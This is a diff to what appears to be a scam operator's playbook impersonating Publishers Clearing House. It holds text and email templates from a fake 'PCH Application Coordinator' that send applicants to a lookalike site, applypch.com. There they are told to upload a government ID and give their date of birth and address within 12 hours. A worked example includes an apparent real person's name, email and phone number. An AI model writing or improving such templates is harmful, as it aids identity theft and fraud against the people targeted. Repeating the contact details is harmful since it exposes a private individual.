@@ -125,21 +125,27 @@ Dave Sayer
 PCH Application Coordinator
 ```
 
-**Profile form URL** (prefill from their basic application — encode special characters in browser or link shortener):
+**Profile form URL** — five fields only (from their basic application). Name, email, and phone pre-fill on the form; applicant enters mailing address, DOB, ID, and profile questions on the form itself. Application date is taken from the reference (e.g. `PCH-06052026-1285` → June 5, 2026). URL-encode spaces (`%20`) and phone `+` (`%2B`).
 
+Template:
 ```
-https://applypch.com/documents/application-profile.html?ref=PCH-[DATE]-[ID]&name=[Full Name]&email=[email]&phone=[phone]&category=[category]&date=[YYYY-MM-DD]&address=[street]&city=[city]&region=[region]&postal=[zip]&country=[country]
+https://applypch.com/documents/application-profile.html?ref=PCH-[DATE]-[ID]&name=[Full Name]&email=[email]&phone=[phone]&category=[category]
+```
+
+Example (Pam):
+```
+https://applypch.com/documents/application-profile.html?ref=PCH-06052026-1285&name=Pam%20Taylor&email=pamtaylor0202@gmail.com&phone=%2B12573923811&category=All
 ```
 
 **Then send Text 2** (text track)
 ```
 Hi [First Name], this is Dave Sayer, PCH Application Coordinator.
 
-You confirmed your application on this text — thank you. The next step is to complete your full application and verification profile on our official site (one form — no need to type answers back on text). You will need to upload a photo of your government ID (driver's license, state ID, or passport).
+You confirmed your application on this text — thank you. The next step is your verification profile on our official site (one form — no need to type answers back on text). Your name and contact are already filled in — please complete your mailing address, date of birth, government ID upload (driver's license, state ID, or passport), and the remaining questions.
 
-Open this link on your phone or computer, fill in every section, and submit:
+Open this link on your phone or computer and submit:
 
-https://applypch.com/documents/application-profile.html?ref=PCH-[DATE]-[ID]&name=[Name]&email=[email]&phone=[phone]&category=[category]&date=[YYYY-MM-DD]&address=[street]&city=[city]&region=[region]&postal=[zip]&country=[country]
+[PASTE PROFILE LINK — see example above]
 
 After you submit, you will see a confirmation on screen and receive an email that your profile is being processed for final review.
 
@@ -154,11 +160,11 @@ PCH Application Coordinator
 ```
 Dear [First Name],
 
-Thank you for confirming your application. Please complete your full application and verification profile using the official form below (replaces sending information by reply email):
+Thank you for confirming your application. Please complete your verification profile using the official form below. Your name and contact are already filled in — complete your mailing address, date of birth, government ID upload, and the remaining questions.
 
-https://applypch.com/documents/application-profile.html?ref=PCH-[DATE]-[ID]&name=[Name]&email=[email]&phone=[phone]&category=[category]&date=[YYYY-MM-DD]&address=[street]&city=[city]&region=[region]&postal=[zip]&country=[country]
+[PASTE PROFILE LINK — see Profile form URL above]
 
-The form includes identity verification (government ID upload required), address, and final review questions. After submission you will receive email confirmation and see a success message on screen while your file is processed. Your ID is attached to the operator notification email only.
+The form includes identity verification (government ID upload required) and final review questions. After submission you will receive email confirmation and see a success message on screen while your file is processed. Your ID is attached to the operator notification email only.
 
 Please complete within 12 hours.
 
